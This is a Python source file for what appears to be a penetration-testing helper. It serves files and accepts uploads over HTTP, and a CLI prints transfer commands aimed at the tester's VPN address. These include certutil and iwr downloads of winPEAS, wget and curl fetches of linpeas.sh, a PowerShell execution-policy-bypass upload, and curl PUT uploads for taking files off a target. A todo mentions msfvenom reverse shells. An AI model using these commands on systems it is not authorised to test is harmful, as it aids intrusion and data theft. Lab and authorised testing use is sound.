#!/usr/bin/env python

'''
Extend Python's built in HTTP server to save files.
Built from: https://gist.github.com/darkr4y/761d7536100d2124f5d0db36d4890109
'''

import os
import sys
import argparse
import socketserver
import cmd
from threading import Thread
import subprocess
import time
try:
    import http.server as server
except ImportError:
    # Handle Python 2.x
    import SimpleHTTPServer as server


# gather vpn info
try:
    result = subprocess.run(
        ['ifconfig', 'tun0'],
        capture_output=True,
        text=True,
        check=True
    )
    for line in result.stdout.splitlines():
        if 'inet ' in line:
            _VPN_STATUS = "ON"
            _VPN_IP = line.split()[1]
except subprocess.CalledProcessError:
    result = subprocess.run(
        ['ifconfig', 'eth0'],
        capture_output=True,
        text=True,
        check=True
    )
    for line in result.stdout.splitlines():
        if 'inet ' in line:
            _VPN_STATUS = "OFF"
            _VPN_IP = line.split()[1]
print(f"VPN: {_VPN_STATUS}")
print(f"IP : {_VPN_IP}")

# extend httpserver class for uploads
class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
    def do_PUT(self):
        """Save a file following a HTTP PUT request"""
        filename = os.path.basename(self.path)

        # Don't overwrite files
        if os.path.exists(filename):
            self.send_response(409, 'Conflict')
            self.end_headers()
            reply_body = '"%s" already exists\n' % filename
            self.wfile.write(reply_body.encode('utf-8'))
            return

        file_length = int(self.headers['Content-Length'])
        read = 0
        with open(filename, 'wb+') as output_file:
            while read < file_length:
                new_read = self.rfile.read(min(66556, file_length - read))
                read += len(new_read)
                output_file.write(new_read)
        self.send_response(201, 'Created')
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode('utf-8'))


# Command-line interface class
class CLI(cmd.Cmd):
    intro = 'Welcome to the file search CLI. Type help or ? to list commands.'
    prompt = '>> '

    def __init__(self):
        super().__init__()
        self._PORT = 8000

    # search for file
    def do_search(self, arg):
        "Search for files in the current directory.\nUsage: search <pattern>"
        pattern = arg.strip()
        if not pattern:
            print("Please provide a search pattern.")
            return

        pattern = pattern.lower() # case-insensitive
        for root, dirs, files in os.walk(os.getcwd()):
            for file in files:
                if pattern in file.lower():
                    absolute_file_path = os.path.join(root, file)
                    relative_file_path = os.path.relpath(absolute_file_path, os.getcwd())
                    print(relative_file_path)

    # alias for search
    def do_s(self, arg):
        return self.do_search(arg)

    # show commands to download
    def do_downloads(self, arg):
        "Display commands to download from this server.\nUsage: downloads [FILE]\n\tDefault file: peas"
        args = arg.split()
        FILE = args[0] if len(args) > 0 else None
        if FILE:
            FILENAME = os.path.basename(FILE)

        if FILE:
            print("[*] Win download commands:")
            print(f"iwr -Uri http://{_VPN_IP}:{self._PORT}/{FILE} -O {FILENAME}")
            print(f"certutil.exe -urlcache -split -f http://{_VPN_IP}:{self._PORT}/{FILE} {FILENAME}")
            print("[*] Linux download commands:")
            print(f"wget {_VPN_IP}:{self._PORT}/{FILE}")
            print(f"curl -o {FILENAME} http://{_VPN_IP}:{self._PORT}/{FILE}")
        else:
            print("[*] Win download commands:")
            print(f"iwr -Uri http://{_VPN_IP}:{self._PORT}/peas/winPEASx64.exe -O C:\\Users\\Public\\winpeas.exe")
            print(f"certutil.exe -urlcache -split -f http://{_VPN_IP}:{self._PORT}/peas/winPEASx64.exe winpeas.exe")
            print("[*] Linux download commands:")
            print(f"wget {_VPN_IP}:{self._PORT}/peas/linpeas.sh")
            print(f"curl -o linpeas.sh http://{_VPN_IP}:{self._PORT}/peas/linpeas.sh")

    # alias for downloads
    def do_d(self,arg):
        return self.do_downloads(arg)

    # show commands to upload to the server
    def do_uploads(self, arg):
        "Display commands to upload to this server.\nUsage: uploads [FILE]\n\tDefault filename: file.txt"
        args = arg.split()
        FILENAME = args[0] if len(args) > 0 else "file.txt"
        
        print("[*] Win upload command:")
        print(f"powershell -ep bypass -c \"(New-Object Net.WebClient).UploadFile('http://{_VPN_IP}:{self._PORT}/{FILENAME}', 'PUT', '{FILENAME}');\"")
        print("[*] Linux upload commands:")
        print(f"curl -X PUT -T \"{FILENAME}\" \"http://{_VPN_IP}:{self._PORT}/{FILENAME}\"")
        return

    # alias for uploads
    def do_u(self,arg):
        return self.do_uploads(arg)


    # todo - run msfvenom and place revshell in revshells dir

    # exit
    def do_exit(self, arg):
        "Exit the CLI."
        print("Exiting file search CLI.")
        return True


# Function to start the HTTP server in a separate thread
def start_http_server(directory, port):
    os.chdir(directory)
    server.test(HandlerClass=HTTPRequestHandler, port=port)
#    handler = server.HTTPRequestHandler
#    httpd = socketserver.TCPServer(("", port), handler)
#    httpd.serve_forever()

# Main function to handle arguments and start the servers
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="hosting script")
    parser.add_argument('-p', '--port', type=int, default=8000, help="Port for the HTTP server (default: 8000)")
    parser.add_argument('-d', '--directory', type=str, default=os.getcwd(), help="Directory for the HTTP server root (default: current directory)")

    args = parser.parse_args()
    
    # Start HTTP server in a separate thread
    print(f"HTTP server started at http://localhost:{args.port}\n")
    http_thread = Thread(target=start_http_server, args=(args.directory, args.port))
    http_thread.daemon = True  # Daemonize the thread to exit when the main program exits
    http_thread.start()

    # Start the CLI
    time.sleep(0.25) # wait for server to start
    cli = CLI()
    cli._PORT = args.port
    cli.cmdloop()

if __name__ == '__main__':
    main()

